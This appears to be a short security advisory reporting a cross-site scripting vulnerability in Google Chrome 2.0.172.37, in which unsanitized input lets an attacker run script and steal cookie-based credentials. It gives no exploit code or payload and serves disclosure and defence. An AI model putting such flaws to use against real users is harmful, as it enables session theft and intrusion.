Google Chrome is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this issue to execute arbitrary script code in the context of the user running the application and to steal cookie-based authentication credentials and other sensitive data that may aid in further attacks.

Chrome 2.0.172.37 is vulnerable; other versions may also be affected.
